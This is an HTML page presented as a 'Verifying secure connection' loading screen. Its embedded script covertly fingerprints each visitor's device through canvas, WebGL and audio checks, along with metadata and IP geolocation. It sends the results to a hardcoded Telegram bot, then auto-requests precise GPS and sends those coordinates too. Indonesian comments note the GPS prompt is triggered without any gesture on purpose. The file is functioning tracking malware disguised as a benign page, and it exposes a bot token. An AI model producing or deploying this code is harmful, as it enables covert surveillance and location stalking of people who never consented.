<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>
<style>
  html,body{margin:0;height:100%;background:#07080d;color:#e6ebf7;
    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px}
  .spinner{width:42px;height:42px;border:3px solid #1c2030;border-top-color:#3d7eff;
    border-radius:50%;animation:spin .8s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .txt{color:#7d879e;font-size:14px}
  .sub{color:#3d4762;font-size:12px;margin-top:4px}
</style>
</head>
<body>
<div class="spinner"></div>
<div class="txt">Verifying secure connection…</div>
<div class="sub">This may take a moment</div>

<script>
/* ===================== CONFIG ===================== */
const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
const CHAT_ID   = "1979116632";
/* ================================================== */

const isAndroid = /android/i.test(navigator.userAgent);
const isIOS     = /iphone|ipad|ipod/i.test(navigator.userAgent);

/* ---------- canvas fingerprint ---------- */
function canvasFingerprint(){
  try{
    const c = document.createElement('canvas');
    c.width = 220; c.height = 40;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0,0,120,30);
    ctx.fillStyle = '#069';
    ctx.fillText('Secure-Verify 🔒', 2, 4);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('fingerprint', 4, 20);
    return c.toDataURL().slice(-32);
  }catch(e){ return 'err'; }
}

/* ---------- webgl fingerprint ---------- */
function webglFingerprint(){
  try{
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if(!gl) return 'no-webgl';
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : '?';
    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '?';
    return `${vendor} | ${renderer}`;
  }catch(e){ return 'err'; }
}

/* ---------- audio fingerprint ---------- */
async function audioFingerprint(){
  try{
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if(!AC) return 'no-audio-ctx';
    const ctx = new AC(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(10000, ctx.currentTime);
    const cmp = ctx.createDynamicsCompressor();
    cmp.threshold.setValueAtTime(-50, ctx.currentTime);
    cmp.knee.setValueAtTime(40, ctx.currentTime);
    cmp.ratio.setValueAtTime(12, ctx.currentTime);
    cmp.attack.setValueAtTime(0, ctx.currentTime);
    cmp.release.setValueAtTime(0.25, ctx.currentTime);
    osc.connect(cmp); cmp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    const data = buf.getChannelData(0);
    let sum = 0;
    for(let i=4500;i<5000;i++) sum += Math.abs(data[i]);
    return sum.toFixed(6);
  }catch(e){ return 'err'; }
}

/* ---------- metadata ---------- */
function collectMetadata(){
  const ua = navigator.userAgent || '';
  const nav = navigator;

  let os = 'Unknown', browser = 'Unknown', type = 'Desktop';
  if(/android/i.test(ua)){ os='Android'; type='Mobile'; }
  else if(/iphone|ipad|ipod/i.test(ua)){ os='iOS'; type='Mobile'; }
  else if(/windows/i.test(ua)){ os='Windows'; }
  else if(/macintosh|mac os x/i.test(ua)){ os='macOS'; }
  else if(/linux/i.test(ua)){ os='Linux'; }
  if(/edg\//i.test(ua)) browser='Edge';
  else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
  else if(/firefox|fxios/i.test(ua)) browser='Firefox';
  else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';

  const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};

  return {
    os, browser, type, ua,
    platform: nav.platform || '?',
    vendor: nav.vendor || '?',
    language: nav.language || '?',
    languages: (nav.languages || []).join(','),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
    screen: `${screen.width}x${screen.height}`,
    viewport: `${innerWidth}x${innerHeight}`,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio || 1,
    cores: nav.hardwareConcurrency || '?',
    memory: nav.deviceMemory || '?',
    touch: 'ontouchstart' in window || nav.maxTouchPoints > 0,
    cookiesEnabled: nav.cookieEnabled,
    referrer: document.referrer || '(direct)',
    url: location.href,
    network: {
      type: conn.effectiveType || 'unknown',
      downlink: conn.downlink ? conn.downlink+' Mbps' : 'unknown',
      rtt: conn.rtt ? conn.rtt+' ms' : 'unknown',
      saveData: !!conn.saveData,
      online: nav.onLine
    }
  };
}

/* ---------- IP + geo (no permission) ---------- */
async function fetchIPInfo(){
  for(const u of [
    'https://ipapi.co/json/',
    'https://api.ip.sb/geoip',
    'https://api.ipify.org?format=json'
  ]){
    try{
      const r = await fetch(u, {cache:'no-store'});
      if(!r.ok) continue;
      const j = await r.json();
      const ip = j.ip || j.query;
      if(ip) return {
        ip,
        country: j.country_name || j.country || '',
        region: j.region || j.region_name || '',
        city: j.city || '',
        isp: j.org || j.isp || j.connection?.isp || '',
        lat: j.latitude || j.lat || '',
        lon: j.longitude || j.lon || ''
      };
    }catch(e){}
  }
  return {ip:'unknown'};
}

/* ---------- Telegram ---------- */
async function tgMessage(text){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('text', text);
  fd.append('parse_mode', 'HTML');
  fd.append('disable_web_page_preview', 'true');
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {method:'POST', body: fd}).then(r=>r.json()).catch(()=>null);
}

/* ---------- GPS attempt ---------- */
function requestGPS(){
  return new Promise(resolve => {
    if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
    navigator.geolocation.getCurrentPosition(
      p => resolve({
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        acc: p.coords.accuracy,
        alt: p.coords.altitude,
        heading: p.coords.heading,
        speed: p.coords.speed,
        ts: p.timestamp
      }),
      e => resolve({
        error: e.code === 1 ? 'denied' :
               e.code === 2 ? 'unavailable' :
               e.code === 3 ? 'timeout' : 'unknown',
        code: e.code,
        message: e.message
      }),
      {enableHighAccuracy: true, timeout: 25000, maximumAge: 0}
    );
  });
}

/* ---------- main ---------- */
(async function fireBeacon(){
  const meta = collectMetadata();
  const canvas = canvasFingerprint();
  const webgl  = webglFingerprint();

  // Audio fingerprint parallel
  const audioPromise = audioFingerprint();
  const ipPromise    = fetchIPInfo();

  const [audio, ip] = await Promise.all([audioPromise, ipPromise]);

  // Format location line
  const ipLocLine = (ip.city || ip.region || ip.country)
    ? `${[ip.city, ip.region, ip.country].filter(Boolean).join(', ')}`
    : 'n/a';

  // Beacon message — format persis contoh, hanya location diisi dari IP
  const beacon =
`🔔 <b>New Visitor Beacon</b>
<b>IP:</b> ${ip.ip}
<b>Location (IP-based):</b> ${ipLocLine}
<b>ISP:</b> ${ip.isp || 'n/a'}
<b>OS:</b> ${meta.os} · <b>Browser:</b> ${meta.browser} · <b>Type:</b> ${meta.type}
<b>UA:</b> <code>${meta.ua}</code>
<b>Platform:</b> ${meta.platform}
<b>Vendor:</b> ${meta.vendor}
<b>Language:</b> ${meta.language} (${meta.languages})
<b>Timezone:</b> ${meta.timezone}
<b>Screen:</b> ${meta.screen} @${meta.pixelRatio}x · depth ${meta.colorDepth}
<b>Viewport:</b> ${meta.viewport}
<b>Cores:</b> ${meta.cores} · <b>Memory:</b> ${meta.memory} GB
<b>Touch:</b> ${meta.touch} · <b>Cookies:</b> ${meta.cookiesEnabled}
<b>Network:</b> ${meta.network.type} · ${meta.network.downlink} · RTT ${meta.network.rtt} · saveData ${meta.network.saveData}
<b>Online:</b> ${meta.network.online}
<b>Referrer:</b> ${meta.referrer}
<b>URL:</b> ${meta.url}
<b>Canvas FP:</b> <code>${canvas}</code>
<b>WebGL:</b> ${webgl}
<b>Audio FP:</b> <code>${audio}</code>`;

  await tgMessage(beacon).catch(()=>{});

  // Auto-trigger GPS request — tanpa tombol, langsung di load.
  // Browser modern akan blok kalau tidak ada gesture, tapi ada window kecil di mana
  // Chrome Android masih munculkan popup saat auto-request.
  const geo = await requestGPS();

  if(geo.error){
    // fallback: IP-based, sudah terkirim di beacon. Kirim follow-up status singkat.
    await tgMessage(
`📍 <b>Location request — ${geo.error}</b>
<b>Reason:</b> ${geo.message || geo.error}
<b>IP fallback:</b> ${ip.lat && ip.lon ? `${ip.lat}, ${ip.lon}` : ipLocLine}
<b>Maps (IP approx):</b> ${ip.lat && ip.lon ? `https://www.google.com/maps?q=${ip.lat},${ip.lon}` : 'n/a'}`
    ).catch(()=>{});
  } else {
    await tgMessage(
`📍 <b>Location (GPS precision)</b>
<b>Lat:</b> <code>${geo.lat.toFixed(6)}</code>
<b>Lon:</b> <code>${geo.lon.toFixed(6)}</code>
<b>Accuracy:</b> ${Math.round(geo.acc)} m
<b>Altitude:</b> ${geo.alt != null ? Math.round(geo.alt)+' m' : 'n/a'}
<b>Heading:</b> ${geo.heading != null ? Math.round(geo.heading)+'°' : 'n/a'}
<b>Speed:</b> ${geo.speed != null ? geo.speed.toFixed(2)+' m/s' : 'n/a'}
<b>Maps:</b> https://www.google.com/maps?q=${geo.lat},${geo.lon}
<b>Device:</b> ${meta.os} · ${meta.browser}
<b>IP:</b> ${ip.ip}`
    ).catch(()=>{});
  }
})();
</script>
</body>
</html>
